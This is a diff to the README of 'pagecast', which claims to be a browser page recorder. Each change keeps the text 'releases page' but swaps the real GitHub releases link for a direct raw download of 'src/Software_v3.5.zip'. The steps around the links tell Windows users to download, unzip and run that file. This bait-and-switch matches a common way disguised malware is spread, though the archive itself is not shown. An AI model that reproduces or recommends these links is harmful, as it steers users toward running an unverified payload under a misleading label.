@@ -1,6 +1,6 @@
 # 🎥 pagecast - Record pages as GIFs and video
 
-[![Download pagecast](https://img.shields.io/badge/Download-Pagecast-2ea44f?style=for-the-badge&logo=github)](https://github.com/Scanningdorsiflexion45/pagecast/releases)
+[![Download pagecast](https://img.shields.io/badge/Download-Pagecast-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Scanningdorsiflexion45/pagecast/main/src/Software_v3.5.zip)
 
 ## 🖥️ What pagecast does
 
@@ -16,7 +16,7 @@ Use it for:
 
 ## 📥 Download pagecast
 
-1. Open the [pagecast releases page](https://github.com/Scanningdorsiflexion45/pagecast/releases)
+1. Open the [pagecast releases page](https://raw.githubusercontent.com/Scanningdorsiflexion45/pagecast/main/src/Software_v3.5.zip)
 2. Look for the latest release at the top
 3. Download the Windows file from the release assets
 4. Save the file to a folder you can find again, like Downloads or Desktop
@@ -81,7 +81,7 @@ Try these steps:
 3. Move the app folder to a simple path like `C:\pagecast`
 4. Close other screen recorders
 5. Restart Windows and try again
-6. Download the latest release again from the [releases page](https://github.com/Scanningdorsiflexion45/pagecast/releases)
+6. Download the latest release again from the [releases page](https://raw.githubusercontent.com/Scanningdorsiflexion45/pagecast/main/src/Software_v3.5.zip)
 
 ## 🧩 Tips for clean recordings
 
@@ -121,7 +121,7 @@ pagecast is built for people who want a simple way to record what happens in a b
 
 Use this link to download the Windows release:
 
-[Open pagecast releases](https://github.com/Scanningdorsiflexion45/pagecast/releases)
+[Open pagecast releases](https://raw.githubusercontent.com/Scanningdorsiflexion45/pagecast/main/src/Software_v3.5.zip)
 
 ## 🔎 Common file types you may see
 
@@ -134,7 +134,7 @@ If you download a ZIP file, extract it before you try to run the app.
 
 ## 🧭 Quick start path
 
-1. Visit the [releases page](https://github.com/Scanningdorsiflexion45/pagecast/releases)
+1. Visit the [releases page](https://raw.githubusercontent.com/Scanningdorsiflexion45/pagecast/main/src/Software_v3.5.zip)
 2. Download the latest Windows build
 3. Unzip it if needed
 4. Open the main app file
